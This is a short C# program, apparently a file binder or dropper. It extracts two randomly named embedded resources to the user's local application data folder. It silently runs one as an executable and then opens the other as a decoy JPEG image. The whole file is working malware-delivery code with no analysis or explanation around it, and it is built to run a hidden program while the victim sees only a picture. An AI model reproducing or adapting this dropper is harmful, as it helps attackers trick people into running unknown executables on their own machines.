using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;

namespace Bound;

internal static class Open
{
	private static void Main()
	{
		try
		{
			ResourceManager resourceManager = new ResourceManager("files", Assembly.GetExecutingAssembly());
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "iVaoKWUxUD.exe", (byte[])resourceManager.GetObject("FFGZeFlHSr"));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "iVaoKWUxUD.exe");
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "hsgSoE_RN_..jpeg", (byte[])resourceManager.GetObject("MvFPcTxSnX"));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "hsgSoE_RN_..jpeg");
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Console.Read();
		}
	}
}
